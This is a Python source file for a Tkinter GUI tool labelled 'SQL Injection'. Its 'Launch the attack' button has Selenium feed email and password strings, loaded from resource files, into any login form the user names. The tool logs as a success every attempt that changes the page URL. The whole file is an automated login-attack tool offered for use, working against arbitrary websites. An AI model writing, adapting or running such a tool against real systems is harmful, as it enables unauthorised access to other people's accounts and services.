from tkinter import Frame, Label, Entry, Button, Text
from selenium import webdriver

import os


class SQLInjection(Frame):

    def __init__(self, parent, controller):

        Frame.__init__(self, parent)
        self.controller = controller

        Label(self, text="Login URL:").pack()
        self.login_url_entry = Entry(self)
        self.login_url_entry.pack()

        Label(self, text="Email XPath:").pack()
        self.email_xpath_entry = Entry(self)
        self.email_xpath_entry.pack()

        Label(self, text="Password XPath:").pack()
        self.password_xpath_entry = Entry(self)
        self.password_xpath_entry.pack()

        Label(self, text="Confirm XPath:").pack()
        self.confirm_xpath_entry = Entry(self)
        self.confirm_xpath_entry.pack()

        self.result_text = Text(self)
        self.result_text.pack()

        Button(self, text="Launch the attack", command=self.launch_attack).pack()

    def launch_attack(self):

        directory_path = os.path.dirname(os.path.realpath(__file__))

        emails_path = os.path.join(directory_path, '../Resources/SQL Injection/emails.txt')
        passwords_path = os.path.join(directory_path, '../Resources/SQL Injection/passwords.txt')

        with open(emails_path, 'r') as f:
            emails = [line.strip() for line in f]

        with open(passwords_path, 'r') as f:
            passwords = [line.strip() for line in f]
        
        self.result_text.delete('1.0', 'end')

        success_counter = 0
        fail_counter = 0

        driver = webdriver.Chrome()

        for i in range(0, len(emails)):

            start_url = self.login_url_entry.get()

            email = emails[i]
            password = passwords[i]

            driver.get(start_url)

            email_element = driver.find_element_by_xpath(self.email_xpath_entry.get())
            password_element = driver.find_element_by_xpath(self.password_xpath_entry.get())
            confirm_element = driver.find_element_by_xpath(self.confirm_xpath_entry.get())

            email_element.clear()
            email_element.send_keys(emails[i])

            password_element.clear()
            password_element.send_keys(passwords[i])

            confirm_element.click()

            end_url = driver.current_url

            if start_url != end_url:
                message = "Success"
                success_counter += 1
            else:
                message = "Failed"
                fail_counter += 1

            self.result_text.insert('end', f"{message} with email: {email}, password: {password}\n")

        self.result_text.insert('end', f"\nSummary:\nSuccesses: {success_counter}\nFailures: {fail_counter}\n")
